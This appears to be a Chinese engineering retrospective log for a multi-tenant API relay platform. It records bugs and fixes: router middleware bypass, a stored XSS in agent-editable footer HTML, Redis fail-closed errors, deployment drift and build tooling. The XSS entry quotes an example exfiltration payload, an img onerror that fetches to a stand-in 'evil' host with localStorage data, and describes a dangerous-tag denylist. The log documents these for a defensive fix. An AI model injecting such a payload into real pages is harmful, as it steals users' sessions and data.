- **根因**：`router/main.go:20` 调 `SetMtRouter(router)` 传的是 `*gin.Engine`；`SetMtRouter` 内各组直接 `router.Group("/api/tenant"|"/api/pay"|"/api/admin/…")` 挂在 **engine** 上，是 `SetApiRouter` 里 `apiRouter := router.Group("/api")`（其 `.Use(RouteTag/gzip/BodyStorageCleanup/GlobalAPIRateLimit)`）的**兄弟组**而非子组。**gin 的 `Group()` 在创建时快照父链**，`apiRouter.Use(...)` 只追加到 apiRouter 自身 handler 链、**不按 URL 路径前缀继承**给别的组。engine 级只有 `CustomRecovery/RequestId/PoweredBy/I18n/Sessions`，无任何限流/体积门 → 上游同类端点（stripe/creem/waffo webhook 挂 anonymousRequestBodyLimit、user/topup 挂 CriticalRateLimit）全有保护，自研的一个都没挂。「限流没开」是误判，真相是「限流开着但对自研代码不生效」。
- **解决/规避**：`router/mt-router.go` 内建一个与 apiRouter **同基础链**的 `/api` 基组 `apiBase := router.Group("/api")` + `.Use(RouteTag("api") / gzip / BodyStorageCleanup / GlobalAPIRateLimit)`，把**全部** 15 个自研组（tenant / pay / internal-domain / agent-plans-public + 12 个 admin/*）从 `router.Group` 改挂 `apiBase.Group`（**URL 路径逐字节不变**——这些 path 本就已在 engine radix tree 里注册过，仅补齐 handler 链，零新增路径冲突风险；apiBase 与 apiRouter 双 `/api` 组注册的 leaf 互斥，单请求只命中一条链、不会双跑）。再补上游对等的靶向门：money 端点（redeem / wallet-recharge / token-plans&agent-plans purchase / withdrawals）加 `CriticalRateLimit()`（20/20min/IP，镜像上游 `/api/user/topup`，置于 UserAuth 之后）；公开回调（wechat/alipay notify）加 `anonymousRequestBodyLimit`（镜像上游 webhook）。注：redeem 未加 Turnstile——上游对等基准 topup 也只有 CriticalRateLimit，保持一致。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go vet` 待服务器验证。代码仅在本地 git 工作树。**
- **升级**：**已升级为规则 → CLAUDE.md C2**。凡通过 `SetMtRouter(*gin.Engine)` 等拿到 engine 的自研装配点，新增 `/api/**` 路由必须挂在与 apiRouter 同基础链的 `apiBase` 下（严禁直接 `engine.Group("/api/…")`），公开/money 端点再单独对齐上游靶向中间件；记入 memory `mt-router-bypasses-api-middleware`。

### [已解决] 代理自配页脚未净化经 dangerouslySetInnerHTML 渲染 → 存储型 XSS（Critical，可接管其名下终端用户账号）
- **现象**：`ValidatePatch`（`internal/siteconfig/policy.go`）逐字段校验 ThemePreset/ThemeColor/HomeMode 并显式锁死 CustomHTML（非空即 `HOME_MODE_LOCKED`，注释「一期锁定」），**但同一个 patch 上的 `Footer` 完全不进校验表**：`applyPatch` 原样 `cfg.Footer = *in.Footer` 落库 → 经**公开、无鉴权**的 `GET /api/tenant/current`（`internal/mtwire/http.go` 下发 `"footer": cfg.Footer`）吐出 → 前端 `use-tenant-brand.ts` 覆写 `footerHtml` → `footer.tsx:208` **裸 `dangerouslySetInnerHTML`、无 DOMPurify** 渲染。任意 `level≥1` 代理在「站点装修 → 页脚」填 `<img src=x onerror="fetch('//evil/?c='+localStorage.user)">` → 其名下**所有终端用户任意页面**（页脚在 layout 里）即刻执行 → 以受害者身份建 API token / 读页面上的 key / 改邮箱密码 / 转余额。三放大器：① 全仓无 CSP（内联 handler 可执行）；② payload 进 `localStorage`（system-config-store persist），网络请求前即渲染、服务端删库后受害者浏览器仍复现，极难应急止血；③ `withCredentials:true` + user 存 localStorage，可直接接管账号。边界（据实）：session cookie 是 `HttpOnly + host-only + SameSite=Strict`，裸 cookie 窃取与跨子域打主站被挡，影响限该代理自己的租户域内，非平台级接管。
- **根因**：`ValidatePatch` 采用「逐字段**白名单校验**」——凡未列入校验表的字段（Footer）就直接穿过 `applyPatch` 落库。这是**模式风险**（比这条 bug 本身更值得注意）：新增/遗漏字段即静默绕过既有安全决定（「代理不得注入任意 HTML」的决定明明已对 CustomHTML 生效，Footer 从同一端点绕过）。叠加渲染端 `footer.tsx` 是**唯一未消毒的代理字段 HTML sink**（其余 4 处 `dangerouslySetInnerHTML`：`html-content.tsx`/`markdown.tsx` 已走 DOMPurify、`chart.tsx`/`landing-react` 是静态 CSS）。
- **解决/规避**：纵深两层、零新依赖——**L1 渲染端（权威）** `footer.tsx` 复用仓库**已内置**的 `dompurify@3.4.11`：`safeFooterHtml = useMemo(() => footerHtml ? DOMPurify.sanitize(footerHtml) : '', [footerHtml])`，sink 改渲染 `safeFooterHtml`（连已持久化进 localStorage 的旧 payload 也在下次渲染被中和，破放大器②，无需删库即可止血）。**L2 端点（策略强制）** `policy.go` 给 `ValidatePatch` 补 `Footer` 校验：长度上限 `MaxFooterBytes=8KiB` + 危险模式黑名单 `footerDangerRe`（脚本/iframe/object/embed/style/link/meta/svg/base/form 标签、内联 `on<event>=` 事件处理器、`javascript:`/`vbscript:`/`data:text/html` 伪协议）→ 命中即返新错误码 `FOOTER_INVALID`（`errors.go`）；`service.Patch` 先 `ValidatePatch` 再落库，故 reject 真正回给客户端、存储不被触碰。良性 HTML（链接/加粗）仍放行。补 6 条表驱动单测（脚本/onerror/svg-onload/js-uri/iframe/超长）。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go test ./internal/siteconfig/` 待服务器验证。代码仅在本地 git 工作树。**
- **升级**：**已升级为规则 → CLAUDE.md C3**。安全铁律「默认拒绝」：凡代理可写且最终可能到达 HTML/JS sink 的自由文本字段，必须在 `ValidatePatch` 逐字段列举校验（不得默认放行），且渲染端必须 DOMPurify；新增此类字段（如公告若改 HTML 渲染）须同步两处。记入 memory `siteconfig-footer-xss-and-default-deny`。

### [已解决] 风控把基础设施错误当策略拒绝 → Redis 一宕机 /v1 全站 500（fail-closed，与代码自身契约相反，High）
- **现象**：`internal/mtwire/risk.go:38-39` 的设计契约白纸黑字写「best-effort：panic / DB 查询错误一律放行（绝不误杀正常流量）；仅确切命中状态/限流时返回 4xx」，但实现相反——**Redis 一宕机，三个域名的 `/v1` 100% 返 500，直到人工重启 redis**。客户端（codex/cursor）把 5xx 当临时错误狂重试，把单点故障放大成全站雪崩；且日志里**没有任何一行**说「风控因 Redis 不可用」，排障会先误查上游渠道。触发条件是例行运维事件（redis OOM / 镜像升级重启），非严格「正常操作」，故定 High（子代理判 Critical，主审员保守下调）——但影响面是全平台，是全篇第一优先级稳定性修复。
- **根因**：`risk.Engine` 故意把**基础设施错误**与**策略拒绝**压进同一个 error 返回通道（`engine.go:114-116` `n, err := e.kv.Incr(ctx, key); if err != nil { return err }` 返回裸 go-redis error）——这本身是 Engine 的**有意契约**（让调用方决定，有单测 `TestCheckCall_RPMIncrErrorPropagates` 固化：`errBoom` 必须原样上浮）。破在**边界层没有分流**：`mtwire/risk.go:63` 对 `CheckCall` 的任何 error 一律 `apperr.HTTPStatusOf(err)` 取码透传，而该函数（`apperr.go:52-57`）对**非 AppError 归一为 500**。策略拒绝（`ErrRateLimited`=429 / `ErrStatusForbidden`·`ErrIPNotAllowed`=403）都是 `*apperr.AppError` 自带 4xx，唯独裸 redis error 不是 → 归一 500 → fail-closed。生产装配（`wire.go:196-199` 只注入 kv + WithConfig，status/ips/rpm 全 nil）使这条路径**必然触发**：`CheckCall` 唯一实际动作就是 Redis INCR（`RISK_DEFAULT_RPM=60>0`，`engine.go:105` 的 `limit<=0` 短路不成立），唯一可能的 error 就是 Redis 错误。叠加 compose 里 redis **无 restart 策略**（点④，线上核实）→ 崩了不自愈 → 故障窗口 = 到人工介入为止。
- **解决/规避**：修在**边界层**（`mtwire/risk.go` 的 `checkCallHook`），不动 Engine（保住其「原样上浮」契约与单测）——这样一处修复覆盖 `CheckCall` 路径**全部**基础设施错误源（Redis INCR + IP allowlist 后端 + RPM resolver + 状态点查），而非只补 `engine.go:114` 一行。按 HTTP 码分流：`status := apperr.HTTPStatusOf(err)`，仅 `400≤status<500`（确切策略）才 `NewErrorWithStatusCode` 拦截透传；否则（基础设施错误 → 归一 500）`common.SysError(...)` **补上缺失的那行排障日志** 后 `return nil` **fail-open 放行**。良性效果：Redis 宕机时限流暂失效（可接受，best-effort 契约本就允许），但 /v1 正常流量不被误杀。**纵深防御**再给 compose 的 `redis`/`mysql` 补 `restart: unless-stopped`（此前只有 app 有，数据服务崩了需人工介入）——缩短「限流暂失效」窗口。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go test ./internal/mtwire/` 待服务器验证。代码仅在本地 git 工作树。**
- **升级**：候选规则——「基础设施错误（缓存/DB/网络后端）与业务策略拒绝必须分流：best-effort 旁路组件（风控/限流等）遇基础设施错误一律 fail-open 放行且留痕日志，绝不 fail-closed 用 5xx 阻断正常流量；边界层透传 error 前必须判别『是确切策略 AppError 还是裸基础设施错误』」。待用户确认后填入 CLAUDE.md C 段。

---

## 四、工具链与协作

> Git / CI / 文档维护 / 与 AI 协作（vibe coding）过程中反复出现的困难与规避方式。

### [已解决] 错误码前缀不统一 + 详设错误码列表不全
- **现象**：detailed-design §2.8 写 `SIGN_INVALID`/`ORDER_ALREADY_PAID`（无前缀），但各模块实现统一用带前缀码（`PAY_SIGN_INVALID`、`RATIO_BELOW_FLOOR`…）；多个 Worker 还各自补了同命名空间码（`SLUG_INVALID`、`STATS_CROSS_TENANT`、`WALLET_AMOUNT_INVALID`、`AGENT_TYPE_INVALID` 等）。
- **根因**：详设的错误码枚举不完整，且"前缀约定"未硬性写明，多 Agent 并行各自取舍。
- **解决/规避**：统一约定**错误码必须带模块前缀**；以 `doc/api-contract.md` 的「错误码注册表」作为唯一事实源，前端按此对接。
- **升级**：建议升级为 CLAUDE.md 硬约束（错误码命名规范）；待错误码表稳定后固化。

### [已解决-规避] 消费者定义接口导致跨模块值类型分歧，需组装层适配器
- **现象**：并行 Worker 各自在本包定义消费者接口及其值类型 —— `wallet.EarningEntry` ≠ `agent.EarningEntry`，`relay.CallContext` ≠ `risk.CallContext`，各模块各有 `PricingGuard`/`EarningSink`/`PaymentGateway`。编译期零耦合，但无法直接互调。
- **根因**：这是"消费者定义接口（依赖倒置）"模式的固有代价 —— 换来的是每个模块可 mock 依赖独立单测（14 模块平均 ~98.7% 覆盖率正源于此）。
- **解决/规避**：在 `cmd/main` 写**薄适配器**对齐类型（如 `Reference→agent.SourceID` 做幂等键、USD↔¥ 单位换算、`tokenplan.SubscriptionQuotaFactory`→`billing.SubscriptionSourceFactory`）。
- **升级**：已在 progress.md「组装层 TODO」与 api-contract.md「装配映射」登记；集成阶段统一实现，不在各模块内耦合。

### [已解决] 服务器前端 typecheck：bun workspace 的 `catalog:` 依赖必须在 web/ 根装，且 Docker build 不做 tsgo
- **现象**：在 `web/default` 单独 `bun install` 报 `oxlint@catalog: failed to resolve`（一堆 `*@catalog:`），且 `tsgo: command not found`。
- **根因**：`web/` 是 bun workspace，`web/default/package.json` 用 `catalog:` 协议引用版本，**catalog 定义在 workspace 根 `web/package.json` + `web/bun.lock`**——只在子包目录装解析不到 catalog，devDeps（含 tsgo）也装不上。另：根 Dockerfile 前端阶段用 `bun run build`(rsbuild/SWC，只转译**不做类型检查**)，类型错误**不会**让镜像构建失败 → 必须独立跑 `tsgo`。
- **解决**：①typecheck 在 workspace 根装：`docker run -v /root/newapi-compile/web:/web -v newapi_buncache:/root/.bun/install/cache -w /web oven/bun bun install --frozen-lockfile` → 再 `cd default && bun run typecheck`（=`tsgo -b`，看 `EXIT=0`）。②构建/部署用 `/root/newapi-test`（即运行栈 compose 的 working_dir，`docker compose ls` 可查）；typecheck 用带 node_modules 的 `/root/newapi-compile`——改完两边都 scp 同步。③oxlint 不在构建门里，存量告警勿误判为本次引入，只修自己新增行。
- **升级**：纯前端改动验收三步：scp 同步 → workspace 根 `bun install` + `tsgo -b`(EXIT=0) → `docker compose -p newapi_test up -d --build` 后 `grep` 二进制确认标识入包（`docker exec app grep -c <marker> /new-api`）。

### [已解决] 接旧规格前先核对现状：三处"规格已过时"的坑（自定义域名任务）
- **现象**：自定义域名任务书让"仿照 `/api/internal/order/paid` 内网端点"、用 `ERR_DOMAIN_LIMIT` 等错误码、并假设 `.env` 变量会自动进容器——三处都与现状不符。
- **根因/发现**：①`/api/internal/order/paid` 在 realpay-inprocess 重构中**已退役**（现存 internal-auth 范式只剩 `auth-service` 的 `X-Internal-Secret`）。②本仓库错误码**无 `ERR_` 前缀**惯例，一律模块前缀（`TENANT_NOT_FOUND`/`DOMAIN_LIMIT`）。③Docker Compose 的根 `.env` **仅用于 `${...}` 插值，不自动注入容器**——变量必须在 compose `environment:` 块里显式 `KEY: "${KEY}"` 才到 app。
- **解决/规避**：①新内网端点沿用 `X-Internal-Secret`（主站读 `MT_INTERNAL_SECRET` env，恒定时间比较 + deny-by-default），签发脚本走 `127.0.0.1:3100` 直连。②错误码落 `DOMAIN_*`（`internal/tenant/errors.go`）。③`MT_INTERNAL_SECRET`/`MT_SITE_IP` 加进 `deploy/docker-compose.test.yml` 的 `environment:` 块（引用服务器 `.env`）。
- **升级**：**接他人/旧规格前，先用 grep/ToolSearch 核对"被引用的端点/约定/机制是否还存在"**，别照搬过时假设（W1 的延伸）。
### [已解决] Go 编译校验免整栈部署：用 golang:1.25.1 容器只 build（`./...` 会因 embed 缺 dist 报错，须点包）
- **现象**：想在服务器验证后端能否编译，但 W4 本地无 Go，且不想 `docker compose up --build` 重部署运行栈；宿主机也没有 `go`/`bun`/`node`（登录 shell PATH 里都没有，只在 Docker 里）。
- **根因**：服务器工具链全在容器内（`docker images` 有 `golang:1.25.1`（与 go.mod `go 1.25.1` 精确匹配）+ `node:22`/`oven/bun`）。`go build ./...` 会走到 `main.go` 的 `//go:embed web/classic/dist`（scp 源码副本无前端 dist 产物）→ `pattern ... no matching files found` EXIT=1，**并非代码错误**（真实镜像构建先出前端 dist 再 embed）。
- **解决**：只 build 受影响包，绕开 embed：`docker run --rm -v /root/newapi-test:/app -w /app -v newapi_gomodcache:/go/pkg/mod -v newapi_gobuildcache:/root/.cache/go-build -e GOFLAGS=-buildvcs=false -e GOPROXY=https://goproxy.cn,direct golang:1.25.1 sh -c "go build ./internal/... ./router/..."`（`-buildvcs=false` 因 scp 副本非 git 仓；goproxy.cn 因机房在国内；模块/构建缓存挂命名卷复用）。前端 typecheck 同理容器化：`node:22`（或 `oven/bun`）挂 `/root/newapi-compile/web`（已装 node_modules）跑 `tsgo -b`（EXIT=0=过）。容器 sh 是 dash，别用 `${PIPESTATUS[]}`；exit 码用 `cmd > log 2>&1; echo $?`。
- **升级**：后端纯改动验收 = scp 同步 `/root/newapi-test` → 上述 golang 容器点包 `go build` → EXIT=0；无需 compose 重部署。补足 §四前端 typecheck 条，构成前后端"改完不部署也能编译校验"的完整闭环。

### [已解决] feature/finance-report 工作树落后于服务器：缺未入库的 internal/siteconfig/gormrepo（已 3-way 合并入 500L）
- **现象**：本地校验后端时，服务器 `go build` 报 `wire.go: could not import internal/siteconfig/gormrepo`；`a.ReportRepo undefined` 是该 import 失败使整个 mtwire 包类型失效的**级联**。
- **根因**：本 `.ccg` 工作树分支 `feature/finance-report` 的 HEAD **从未含** siteconfig 装配（`git show HEAD:wire.go` 无 siteconfig），而服务器 `/root/newapi-test` 有一份**未入库（scp 而来，git 不跟踪）**的 `internal/siteconfig/gormrepo`（OEM 装修 §5/§9）+ 对应 wire.go/mt-router.go/侧栏/语言包装配。两边 wire.go 各自是公共祖先的超集（本地多 reportrepo、服务器多 siteconfig）——**必须 3-way 合并，不能整文件覆盖**（否则丢 siteconfig）。财务报表改动为纯增量、与 siteconfig 区域不相交：`git diff HEAD -- wire.go mt-router.go` 生成的补丁在服务器真实副本上 `patch --fuzz=3` 干净套用（0 rej），合并后 `go build` EXIT=0 已验证。
- **解决**：其后 siteconfig 已随自定义域名提交（aba3a93/bdfb533）入库，"服务器未入库"顾虑消失 → 遂在 500L 上直接 `git merge feature/finance-report`（真三方合并，非补丁套用）：wire.go/use-sidebar-data.ts git 自动合并（reportrepo + siteconfig 两套 provider 并存、双 AutoMigrate），mt-router.go/RETRO/en+zh 共 4 处**纯增量冲突按并集解决**（en=5214 / zh=5316，无重复键、无值冲突）。并行的 site-branding/主题预设在飞工作（11 文件 + 3 style 键）分离提交、未混入。服务器容器化校验 `go build ./internal/... ./router/...`（golang:1.25.1）+ `tsgo -b`（oven/bun）均 EXIT=0。合并提交 c892e36、主题 c2b12a8。

### [已解决·升级为规则] 合并含新增/改名路由的分支后，必须先重生 routeTree.gen.ts 再跑 tsgo -b
- **现象**：财务报表合并后独立 `tsgo -b` 报 3 处 `TS2345: '<路径>' is not assignable to keyof FileRoutesByPath`——finance 2 条 + admin-custom-domains 1 条（后者是 500L 既有滞后，非本次引入）。
- **根因**：`web/default/src/routeTree.gen.ts` 是 `@tanstack/router-plugin` 的生成物，只在 `rsbuild dev/build` 时从 `src/routes/` 重生；两分支都加了路由源文件却没提交重生后的树，提交树滞后。`createFileRoute('/x')` 的路径要命中生成的 `FileRoutesByPath`，否则类型报错（该文件自身 `@ts-nocheck`，报错落在路由源文件）。rsbuild 部署会自动重生 + SWC 不做类型检查 → **部署不受影响，但独立 tsgo 门会挂**。
- **解决**：服务器容器内跑生成器（无 CLI，用程序化 API，与插件同法 `new Generator({config:getConfig({target:'react',autoCodeSplitting:false},ROOT),root:ROOT}).run()`）：`docker run --rm -v /root/newapi-compile/web:/web -w /web/default node:22 node <脚本>`。`autoCodeSplitting=false` 与既有 eager 树同模式，diff 干净（68 增 0 删，仅补 3 条路由）。重生后 tsgo -b EXIT=0，回传提交 7b190a6。
- **升级**：**合并/rebase 任何新增或改名 `src/routes/**` 的分支后，先 router-generator 重生 routeTree.gen.ts 再验前端**；§四前端验收范式补一步"路由有增改 → 先重生路由树"。见 [[frontend-typecheck-bun-catalog]]。

### [已解决] Workflow 多 Agent 生成的前端文件带尾部 `</content>` 包裹标签（会全量 typecheck/build 失败）
- **现象**：用 Workflow 多 Agent 并行生成工单 default 前端，25 个 `.ts/.tsx` 文件每个末行都多出一个杂散 `</content>` XML 标签（`od -c` 确认真实字节），非法 TS，会让 esbuild/SWC 解析、`bun run typecheck`、`bun run build` 整个 feature 全挂。
- **根因**：子 Agent 落盘时把「工具调用包裹标签」误写进了文件内容尾部（生成产物污染），系统性出现在**每个**新建文件。
- **解决/规避**：Verify 阶段 Agent 用锚定 `sed '/^<\/content>$/d'` 逐文件删除（每文件唯一、恒在末行）；主控二次核验 `grep -rlE '</?content>|^\x60\x60\x60|<file>'` 新增文件 → 0 残留。
- **升级**：**多 Agent 生成/落盘一批文件后，主控必须做「产物完整性扫描」**（stray XML 包裹标签 / ``` 代码围栏 / `<file>` 标签）再进构建门；本机无 go/node 时更要用 grep 静态兜住，别等服务器 typecheck 才发现。

### [已解决] 服务器非 git 副本按「显式文件清单」部署会静默漏文件 → 包内不一致，被后续部署撞出
- **现象**：部署「代理折扣系数」时服务器 `go build` 报 `undefined: ErrPayoutAccountInvalid`（internal/agent/model.go 引用），但本机 `go build` 全过。本机每个包自洽，服务器却缺定义。
- **根因**：服务器 `/root/newapi-test` 是非 git 的 rsync/tar 副本，历来用 `git archive HEAD <显式文件列表> | tar x` 部署——**只覆盖列表内文件，从不删也不补漏**。更早的「提现闭环」把 `internal/agent` 的一批文件（errors.go/service.go/withdrawal.go/port.go/repo.go）改了跨文件符号，但那次部署的显式清单**漏掉了这些文件**，服务器一直是「旧 errors.go（无 ErrPayoutAccountInvalid）+ 旧 model.go（不引用它）」的自洽旧态、能编译。本次我把 model.go 单独推到 HEAD（引用了该符号），而 errors.go 仍是旧的 → 包内不一致 → 编译炸。文件 sha 对比坐实：errors/service/withdrawal/port/repo 五个文件服务器全落后于 HEAD，仅 earning.go 一致。
- **解决**：整目录同步 `git archive HEAD internal/agent | ssh … tar x`（该目录无锁定文件，安全），使包在 HEAD 自洽 → rebuild 通过、health 200、`discount_ratio` 列 AutoMigrate 建好。
- **升级**：**当一次改动新增/改动了某包内跨文件符号（新 error/新导出/改签名），部署要推整个受影响包目录，而非只推自己改的那几个文件**；遇到服务器 `undefined: X`/`could not import` 先按 `git show HEAD:<file> | shasum` vs 服务器 `shasum` 逐文件比对锁定漂移范围。锁定文件（payment_inprocess.go/realpay/*/option.go/payment_wxpay_alipay.go——含未入库 WIP）**不可**整目录 `archive HEAD` 覆盖（会回退 WIP），只能单推自己确需的文件。参见 [[feature-finance-report 工作树落后于服务器]]。

### [未解决·需用户介入] 服务器 /root/newapi-test 源码被外部进程整仓回退（协作者 rsync / deploy.sh 用了过期源）
- **现象**：部署「子域名+删除代理」时服务器 `go build` 报本会话早已加过的符号 `undefined`（AgentParams.DiscountRatio / PayoutAccount / GetPayoutAccount）。逐文件核实发现**整仓退回到会话开始前的状态**：`report.NetIncomeTrend`=0、`tokenplan DiscountRatio`=0、`internal/agent` 全套 DIFF（本会话前的 sha）——即本会话所有后端提交在服务器**源码**上凭空消失（但当时**运行中的二进制**仍是最新，因为上一次部署产物还在跑）。仅我本次刚推的几个文件是 HEAD。
- **根因**：`/root/newapi-test` 是非 git 的 rsync 副本；某个**外部动作**（协作者从自己过期的 Mac 副本 rsync、或 `deploy/ops/deploy.sh` 用了过期源）把整棵源码树覆盖回了旧版。这**不是**我的部署造成的——上一次 i18n 部署（health 200 带我的改动）之后、本次之前发生的。DB 迁移过的列（discount_ratio 等）仍在（只回退了源码文件，没动库）。
- **解决/规避（本次）**：`git archive HEAD | ssh 'tar --exclude=<锁定文件> -xf -'` **整仓 HEAD 覆盖服务器源码（排除锁定 WIP 文件）**恢复所有会话提交；再 `rm` 掉「本会话删除但被回退恢复」的孤儿文件（`git diff --diff-filter=D --name-only <会话基线>..HEAD` 得列表，注意 git archive 只加不删、rspack 会顺着被回退恢复的旧路由/旧组件把引用了已删符号的孤儿也拉进构建 → 编译失败）；重建后 health 200。
- **⚠️ 会复发**：只要那个外部 rsync/deploy 再跑一次，服务器源码会再次被覆盖回退。**需用户排查并停用**：谁/什么在 rsync 到 `/root/newapi-test`？是不是 `deploy/ops/deploy.sh` 的源目录指向了过期副本？多人协作时**约定唯一部署源**（最好是从 git 仓库拉，而非各自 Mac 副本 rsync）。在此之前，每次部署后都要 `grep` 关键符号确认没被回退。参见 [[服务器非 git 副本按显式清单部署漏文件]]。

### [已解决] 验证前端是否进二进制：用 `grep 二进制` 别用 `strings | grep`（strings 丢多字节中文，恒 0 误判）
- **现象**：部署支付概览后 `docker exec … strings /new-api | grep -c 已收款待入账` = 0，连本来在的「折扣系数」「代理加盟」也全 0，误判为"前端没进二进制/构建层命中缓存"，白跑了一次 `--no-cache` 重建。
- **根因**：`strings` 默认只抽 ASCII 可打印串（长度≥4），**中文 UTF-8 是非 ASCII 多字节，会被整段丢弃** → `strings | grep 中文` 恒 0（与前端在不在无关）。之前"折扣系数=2"能查到是因为用了**直接 `grep -c 折扣系数 /new-api`**（grep 匹配二进制里的原始 UTF-8 字节，能命中 embed 的 dist）。
- **解决**：验证 embed 的前端中文串一律 `docker exec <app> sh -c "grep -c <中文> /new-api"`（直接 grep 二进制），不要过 `strings`。直接 grep 后 已收款待入账=1/支付对账=2/待支付=4/折扣系数=3/代理加盟=2，全在。
- **升级**：**「某中文串在不在编译产物里」的判定，永远用直接 grep 二进制，别用 strings**；否则会对着假 0 瞎折腾（重建/回滚）。顺带：Docker 前端构建层（`COPY ./web/default` → `bun run build`）偶发命中旧缓存，真遇到才 `--no-cache` 重建——但先用直接 grep 确认它是真没进，别被 strings 骗。

### [未解决·需用户介入] macOS TCC 隐私保护挡住 CLI 读取 ~/Documents / ~/Desktop（交接素材读不到）
- **现象**：用户交接素材路径 `/Users/cc/Documents/Codex/…/ai-logo-pack/logo-only`（20 个国产模型 logo），CLI 侧 `ls` 报 `Operation not permitted`；连 `ls ~/Documents`、`ls ~/Desktop` 顶层都被拒。非沙箱模式同样被拒。
- **根因**：macOS TCC（隐私与安全性 → 文件与文件夹）按「宿主 App」授权；承载 Claude Code 的终端 App 没有「文稿/桌面」访问权，其全部子进程（含 `!` 前缀命令）一律 `EPERM`。与文件是否存在无关。
- **解决/规避**：二选一——① 系统设置 → 隐私与安全性 → 文件与文件夹（或完全磁盘访问权限）→ 给承载终端授权「文稿」，必要时重启终端 App 后重试；② 用 Finder 把素材拖进仓库或 `/tmp`（TCC 不管这些路径）。**以后交接素材尽量放仓库内或 /tmp，别放 Documents/Desktop。**

### [已解决·规避] 无头 Chrome `--virtual-time-budget` 对含 WebGL rAF 循环的页面截图恒于 ~1s，预算参数不生效
- **现象**：给 bulb-orbit 页面的 `#final`（lit 全景）截图，`--virtual-time-budget` 从 2000 加到 60000 甚至加 `--timeout=300000`，产物像素级不变（画面质心跨档误差 <1px），真实耗时恒约 1s——此时 `.rise` 文字上升动画（延迟 0.3–0.62s + 0.9s 时长，约 1.6s 完成）与 24 芯片扫光（约 2.1s 完成）都还没播完，被提前定格成半成品画面。
- **根因**：页面用 `requestAnimationFrame` 驱动常驻 WebGL 渲染循环（`loop3d`/`renderTick`），无头 Chrome 的虚拟时间预算机制与这类常驻 rAF 循环叠加时不按预算推进，捕获时刻实际由启动到就绪的真实时间决定，与 `--virtual-time-budget` 参数值无关。
- **解决/规避**：需要「动画播完之后」状态的截图改用 playwright：固定视口（本例 1920×990）→ 导航 → 等待 ≥3s 真实墙钟时间 → 截图；`#final` 场景因同文档 fragment 导航不会重新执行脚本，须先导航到 `about:blank` 再导航到带 `#final` 的完整 URL，确保是真实整页加载后再等待截图。
- **升级**：含 WebGL/rAF 常驻循环的页面，今后截「动画播完之后」的状态一律用 playwright + 真实等待，不再用无头 CLI 的 `--virtual-time-budget` 作为时间控制手段。

### [已解决] 额度沉淀监控读「死列」used_usd → 恒显 0 消耗（真源在原生 user_subscriptions.amount_used）
- **现象**：P2-BRK-01 额度沉淀监控上线后，每笔订阅都被当成 0 消耗——`ExpiredUnusedUSD≈Σ全额 limit`（沉淀率≈100%）、`countExhaustedActiveSubs`（used≥95%limit）永不触发、明细 `usage_pct` 恒 0%；买家「我的订阅」页剩余额度也恒等于满额。
- **根因**：`tokenplan_subscriptions.used_usd` 的**唯一写入者是 tokenplan 计费桶的 `Meter`（`gormrepo.go:399` `used_usd += cost`）**，而该桶（`billing.NewService`/`wallet.NewService`）在 `wire.go`/`main.go` **从未装配**（grep 0 命中）。生产 `/v1` 计费实际走**原生订阅桶**（`subscription_bridge.go` `defaultActivateNativeSub` → `model.CreateUserSubscriptionFromPlanTx`），用量记在 **`user_subscriptions.amount_used`（quota 单位）**，由 `PreConsumeUserSubscription`/`PostConsumeUserSubscriptionDelta` 维护。全仓无任何「原生用量 → used_usd」同步代码 → `used_usd` 是永为 0 的**死列**。而监控（`breakage/gormrepo` Overview/Detail/CollectSnapshots + `breakage_snapshot_loop.go` countExhausted）与买家/管理端页全都读这列算 `limit − used`。
- **解决（方案 A · 读侧投影 · 只前向）**：真源经 `s.source_order_id → mt_subscription_orders.native_sub_id → user_subscriptions.amount_used` 关联；`真实 used_usd = amount_used / common.QuotaPerUnit`。① `breakage/gormrepo` 四处查询（Overview 活跃剩余/到期未用、Detail、CollectSnapshots）LEFT JOIN 原生桶投影（新增 `nativeUsedUSD` 片段 + `joinNativeUsage` helper，仍守本包「只借列名不 import 兄弟 model」硬约束）；② `mtwire` `countExhaustedActiveSubs` 同投影；③ 买家/管理端在 mtwire 层（bridge 归属层）`fillNativeUsedUSD` 批量覆盖 `UsedUSD`，保持 tokenplan 仓储不感知原生桶。历史快照不回填（前向修正）。单测 harness（gormrepo_test + mtwire breakage_test）改为把 `used_usd` 置 0、真值只塞 `amount_used`，坐实「只读真源」。服务器 `golang:1.25.1` 容器 `go build ./internal/... ./router/...` + `go test ./internal/breakage/... ./internal/mtwire/...` 全绿。
- **坑点**：SQL 除数须用**浮点字面量**（`500000.0` 而非 `500000`）——sqlite 两整数相除会**截断归零**，浮点字面量强制实数除法，跨 MySQL/sqlite 一致。
- **升级**：**给某列做聚合/监控前，先确认它在生产路径上真的被写**（grep 写入者 + 核实其调用链在 wire.go 是否装配）——「有列且有读逻辑」不等于「有数据」；未装配的计费桶留下的列就是恒零死列。参见 [[used-usd-dead-column-real-usage-native-bucket]]。
